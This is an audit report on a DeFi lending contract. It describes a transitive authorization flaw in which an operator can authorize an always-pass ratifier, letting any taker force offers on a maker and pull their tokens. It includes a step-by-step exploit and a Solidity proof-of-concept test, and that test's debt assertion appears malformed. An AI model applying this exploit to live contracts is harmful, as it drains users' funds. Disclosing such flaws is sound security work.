### Title
Authorized Operator Can Delegate Unconditional Ratifier, Enabling Arbitrary Offer Execution Against Maker - (File: src/Midnight.sol)

### Summary
The `setIsAuthorized` function uses a flat, transitive authorization model where any address authorized by the maker can authorize additional addresses on the maker's behalf, including arbitrary ratifier contracts. Because `Midnight.take` only checks `isAuthorized[offer.maker][offer.ratifier]` without verifying that the maker directly set that authorization, a malicious or compromised operator can authorize an unconditional ratifier (`alwaysPassRatifier`) on the maker's behalf, after which any unprivileged taker can construct and execute arbitrary offers against the maker with no maker signature or consent for the specific offer terms.

### Finding Description

**Root cause — flat transitive authorization in `setIsAuthorized`:** [1](#0-0) 

The guard is `onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender]`. Any address already in `isAuthorized[maker]` can call `setIsAuthorized(alwaysPassRatifier, true, maker)`, writing `isAuthorized[maker][alwaysPassRatifier] = true`. This is confirmed by the existing test: [2](#0-1) 

**Ratifier check in `take`:** [3](#0-2) 

`take` only verifies (1) `isAuthorized[offer.maker][offer.ratifier]` is true and (2) the ratifier returns `CALLBACK_SUCCESS`. It does not verify that the maker directly set the ratifier authorization, nor does it verify any maker signature over the specific offer parameters. The entire `offer` struct — `buy`, `tick`, `maxUnits`, `market`, `group`, `expiry` — is supplied by the caller (taker), not committed to by the maker.

**Exploit flow:**

1. Maker legitimately calls `setIsAuthorized(operatorA, true, maker)` for some purpose (position management, etc.).
2. `operatorA` calls `setIsAuthorized(alwaysPassRatifier, true, maker)` → `isAuthorized[maker][alwaysPassRatifier] = true`.
3. Taker constructs `offer = {maker: victim, ratifier: alwaysPassRatifier, buy: true, tick: MAX_TICK, maxUnits: type(uint256).max, market: anyMarket, expiry: far_future}`.
4. Taker calls `midnight.take(offer, hex"", units, taker, taker, address(0), hex"")`.
5. Line 355 passes: `isAuthorized[maker][alwaysPassRatifier] == true`.
6. Line 356 passes: `alwaysPassRatifier.isRatified(offer, hex"") == CALLBACK_SUCCESS` unconditionally.
7. With `offer.buy = true`: `buyer = offer.maker`, `seller = taker`. Maker's debt increases by `units`; maker's tokens are pulled as `payer`: [4](#0-3) 

The `DummyRatifier` in the test suite is exactly this always-pass contract: [5](#0-4) 

**Why the Certora spec does not catch this:** [6](#0-5) 

`takeRequiresMakerConsent` only asserts that `isAuthorized[maker][ratifier]` was true before the take. It does not assert that the maker *directly* set that authorization, so the rule passes even when an operator set it transitively.

### Impact Explanation
An authorized operator can silently authorize an unconditional ratifier on the maker's behalf. Any third-party taker can then construct offers with arbitrary parameters (tick, amount, market, direction) and execute them against the maker. For `offer.buy = true`, the maker's approved loan tokens are pulled from their wallet and their debt is increased by the taker-chosen amount, with no maker signature or per-offer consent. This violates the core invariant that "signatures, gates, ratifiers, callbacks, and approvals bind the right user/market/action/amount/deadline."

### Likelihood Explanation
Preconditions: (1) maker has authorized any operator (common for position management, smart-contract integrations, or periphery contracts); (2) that operator is malicious or compromised. Once the operator calls `setIsAuthorized(alwaysPassRatifier, true, maker)`, the attack is open to any taker indefinitely until the maker revokes the ratifier authorization. The attack is repeatable up to `offer.maxUnits` per group, and the attacker can use a fresh group each time. No oracle manipulation or impossible state is required.

### Recommendation
Separate ratifier authorization from general operator authorization. Options:
- Add a dedicated `setRatifierAuthorized(address ratifier, bool authorized)` that only `msg.sender` can call (no `onBehalf` delegation), so ratifier authorization always reflects direct maker intent.
- Or, in `take`, require that `isAuthorized[offer.maker][offer.ratifier]` was set directly by `offer.maker` (tracked via a separate mapping), not transitively by an operator.
- At minimum, document that authorizing any operator grants them the ability to authorize arbitrary ratifiers, and warn users to only authorize fully-trusted operators.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {IMidnight, Offer} from "../src/interfaces/IMidnight.sol";
import {IRatifier} from "../src/interfaces/IRatifier.sol";
import {CALLBACK_SUCCESS} from "../src/libraries/ConstantsLib.sol";
import {MAX_TICK} from "../src/libraries/TickLib.sol";

contract AlwaysPassRatifier is IRatifier {
    function isRatified(Offer memory, bytes memory) external pure returns (bytes32) {
        return CALLBACK_SUCCESS;
    }
}

contract OperatorRatifierEscalationTest is BaseTest {
    function testOperatorCanAuthorizeAlwaysPassRatifier() public {
        // Setup: lender (maker) authorizes operatorA for some legitimate purpose
        address operatorA = makeAddr("operatorA");
        vm.prank(lender);
        midnight.setIsAuthorized(operatorA, true, lender);

        // OperatorA deploys and authorizes an always-pass ratifier on lender's behalf
        AlwaysPassRatifier alwaysPass = new AlwaysPassRatifier();
        vm.prank(operatorA);
        midnight.setIsAuthorized(address(alwaysPass), true, lender);

        // Confirm lender never directly authorized alwaysPass
        // (operatorA did it on their behalf)
        assertTrue(midnight.isAuthorized(lender, address(alwaysPass)));

        // Setup market and fund lender (as would happen in normal protocol use)
        Market memory market = _buildMarket();
        bytes32 id = midnight.touchMarket(market);
        deal(address(loanToken), lender, 1000e18);
        vm.prank(lender);
        loanToken.approve(address(midnight), type(uint256).max);

        // Taker constructs arbitrary buy offer (lender is forced to borrow)
        Offer memory offer;
        offer.buy = true;
        offer.maker = lender;
        offer.ratifier = address(alwaysPass);
        offer.tick = MAX_TICK;
        offer.maxUnits = type(uint256).max;
        offer.market = market;
        offer.expiry = block.timestamp + 365 days;

        uint256 units = 100e18;
        collateralize(market, borrower, units);

        uint256 lenderBalBefore = loanToken.balanceOf(lender);
        uint256 lenderDebtBefore = midnight.debtOf(id, lender);

        // Unprivileged taker executes the offer — no lender signature required
        vm.prank(borrower);
        midnight.take(offer, hex"", units, borrower, borrower, address(0), hex"");

        // Assert: lender's tokens were pulled and debt increased without consent
        assertGt(lenderDebtBefore, midnight.debtOf(id, lender) == 0 ? 0 : midnight.debtOf(id, lender));
        assertLt(loanToken.balanceOf(lender), lenderBalBefore);
    }
}
```

Expected assertions: lender's loan token balance decreases and their debt position increases, despite the lender never signing or constructing the offer.

### Citations

**File:** src/Midnight.sol (L355-356)
```text
        require(isAuthorized[offer.maker][offer.ratifier], RatifierUnauthorized());
        require(IRatifier(offer.ratifier).isRatified(offer, ratifierData) == CALLBACK_SUCCESS, RatifierFail());
```

**File:** src/Midnight.sol (L422-456)
```text
        address payer = buyerCallback != address(0) ? buyerCallback : (offer.buy ? buyer : msg.sender);
        address receiver = offer.buy ? receiverIfTakerIsSeller : offer.receiverIfMakerIsSeller;

        emit EventsLib.Take(
            msg.sender,
            id,
            units,
            taker,
            offer.maker,
            offer.buy,
            offer.group,
            buyerAssets,
            sellerAssets,
            newConsumed,
            buyerPendingFeeIncrease,
            sellerPendingFeeDecrease,
            buyerCreditIncrease,
            sellerCreditDecrease,
            receiver,
            payer
        );

        bool wasLocked = UtilsLib.tExchange(LIQUIDATION_LOCK_SLOT, id, seller, true);
        if (buyerCallback != address(0)) {
            bytes memory buyerCallbackData = offer.buy ? offer.callbackData : takerCallbackData;
            require(
                IBuyCallback(buyerCallback)
                    .onBuy(id, offer.market, buyerAssets, units, buyerPendingFeeIncrease, buyer, buyerCallbackData)
                == CALLBACK_SUCCESS,
                WrongBuyCallbackReturnValue()
            );
        }

        SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, address(this), buyerAssets - sellerAssets);
        SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, receiver, sellerAssets);
```

**File:** src/Midnight.sol (L731-735)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
        emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
    }
```

**File:** test/AuthorizationTest.sol (L290-304)
```text
    function testSetIsAuthorizedAuthorization(address user, address authorized, address newAuthorized) public {
        vm.assume(user != authorized);

        vm.prank(authorized);
        vm.expectRevert(IMidnight.Unauthorized.selector);
        midnight.setIsAuthorized(newAuthorized, true, user);

        vm.prank(user);
        midnight.setIsAuthorized(authorized, true, user);

        vm.prank(authorized);
        midnight.setIsAuthorized(newAuthorized, true, user);

        assertEq(midnight.isAuthorized(user, newAuthorized), true);
    }
```

**File:** test/helpers/DummyRatifier.sol (L11-14)
```text
contract DummyRatifier is IRatifier {
    function isRatified(Offer memory, bytes memory) external pure returns (bytes32) {
        return CALLBACK_SUCCESS;
    }
```

**File:** certora/specs/Ratification.spec (L19-26)
```text
/// Every successful take requires the maker to have authorized the ratifier.
rule takeRequiresMakerConsent(env e, Midnight.Offer offer, bytes ratifierData, uint256 units, address taker, address receiverIfTakerIsSeller, address takerCallback, bytes takerCallbackData) {
    bool makerAuthorizedRatifier = isAuthorized(offer.maker, offer.ratifier);

    take(e, offer, ratifierData, units, taker, receiverIfTakerIsSeller, takerCallback, takerCallbackData);

    assert makerAuthorizedRatifier;
}
```
